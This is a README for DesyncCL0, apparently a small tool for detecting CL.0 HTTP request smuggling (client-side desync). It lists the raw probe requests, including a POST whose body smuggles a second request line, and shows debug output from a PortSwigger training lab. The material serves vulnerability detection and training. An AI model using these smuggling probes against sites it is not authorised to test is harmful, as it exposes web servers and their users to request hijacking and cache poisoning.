# DesyncCL0
A simple tool to detect vulnerabilities described here https://portswigger.net/research/browser-powered-desync-attacks.

# Description
The tool will always make four requests below. Requests 1, 2 and 3 will be under different connections and Request 4 will be under the same connection as Request 3.

If the response of Request 4 is the same as Request 1 and different from Request 2 we can safe assume the application is vulnerable.

For more details check the source code.

**Request 1**
```
GET /hopefully404 HTTP/1.1
Foo: xGET / HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Connection: close


```

**Request 2**
```
GET / HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Connection: close


```

**Request 3**
```
POST / HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Content-Length: 34
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded

GET /hopefully404 HTTP/1.1
Foo: x
```

**Request 4**
```
GET / HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Connection: close


```

# Example
```
$ ./DesyncCL0.py
    ____                            
   / __ \___  _______  ______  _____
  / / / / _ \/ ___/ / / / __ \/ ___/
 / /_/ /  __(__  ) /_/ / / / / /__  
/_____/\___/____/\__, /_/ /_/\___/  
                /____/              

version 0.0.1
usage: DesyncCL0 [-h] [-s SMUGGLEDREQUESTLINE] [-t TIMEOUT] [-u USER_AGENT] [-d | --debug | --no-debug] URL
DesyncCL0: error: the following arguments are required: URL
```
Below the output testing the this lab https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-browser-cache-poisoning-via-client-side-desync.
```
$ ./DesyncCL0.py https://0a7f005703d1bcd0c05a8252006200c5.web-security-academy.net/../
    ____                            
   / __ \___  _______  ______  _____
  / / / / _ \/ ___/ / / / __ \/ ___/
 / /_/ /  __(__  ) /_/ / / / / /__  
/_____/\___/____/\__, /_/ /_/\___/  
                /____/              

version 0.0.1
Testing URL: https://0a7f005703d1bcd0c05a8252006200c5.web-security-academy.net/../
Testing for CL.0 vulnerability...
WARNING! Back-end server interpreted the body of the POST request as the start of another request.
```
If you want to see the raw requests and response from the tool you can use the -d flag.
```
$ ./DesyncCL0.py https://0a7f005703d1bcd0c05a8252006200c5.web-security-academy.net/../ -d
    ____                            
   / __ \___  _______  ______  _____
  / / / / _ \/ ___/ / / / __ \/ ___/
 / /_/ /  __(__  ) /_/ / / / / /__  
/_____/\___/____/\__, /_/ /_/\___/  
                /____/              

version 0.0.1
Testing URL: https://0a7f005703d1bcd0c05a8252006200c5.web-security-academy.net/../
Testing for CL.0 vulnerability...
>>>>> request404
GET /hopefully404 HTTP/1.1
Foo: xGET / HTTP/1.1
Host: 0a7f005703d1bcd0c05a8252006200c5.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Connection: close


>>>>> request404
>>>>> httpresponse404
status404: 404
headers404: [('Content-Type', 'application/json; charset=utf-8'), ('Set-Cookie', 'session=clOekfu0vCx7HfJ4OyPAmlcerx4xAiiD; Secure; HttpOnly; SameSite=None'), ('Connection', 'close'), ('Content-Length', '11')]
body404: b'"Not Found"'
<<<<< httpresponse404
>>>>> requestRoot
GET / HTTP/1.1
Host: 0a7f005703d1bcd0c05a8252006200c5.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Connection: close


>>>>> requestRoot
>>>>> httpresponseRoot
statusRoot: 200
headersRoot: [('Content-Type', 'text/html; charset=utf-8'), ('Set-Cookie', 'session=AXGsV1hGyjczbX0M19hchfmJUWXPlDD2; Secure; HttpOnly; SameSite=None'), ('Connection', 'close'), ('Content-Length', '8470')]
bodyRoot: b'<!DOCTYPE html>\n<html>...</html>\n'
<<<<< httpresponseRoot
>>>>> requestDesync
POST /../ HTTP/1.1
Host: 0a7f005703d1bcd0c05a8252006200c5.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Content-Length: 34
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded

GET /hopefully404 HTTP/1.1
Foo: x
>>>>> requestDesync
>>>>> httpresponseDesync
statusDesync: 500
headersDesync: [('Content-Type', 'application/json; charset=utf-8'), ('Set-Cookie', 'session=WZMIupbYcMGXfoFagoNmZLupq6m2CIMT; Secure; HttpOnly; SameSite=None'), ('Keep-Alive', 'timeout=10'), ('Content-Length', '23')]
bodyDesync: b'"Internal Server Error"'
<<<<< httpresponseDesync
>>>>> requestRootSmuggled
GET / HTTP/1.1
Host: 0a7f005703d1bcd0c05a8252006200c5.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Connection: close


<<<<< requestRootSmuggled
>>>>> httpresponseRootSmuggled
statusRootSmuggled: 404
headersRootSmuggled: [('Content-Type', 'application/json; charset=utf-8'), ('Set-Cookie', 'session=Pb6ZiMCGpqnBZC2JSOIDkhBwG0VxjRU1; Secure; HttpOnly; SameSite=None'), ('Connection', 'close'), ('Content-Length', '11')]
bodyRootSmuggled: b'"Not Found"'
<<<<< httpresponseRootSmuggled
WARNING! Back-end server interpreted the body of the POST request as the start of another request.

```
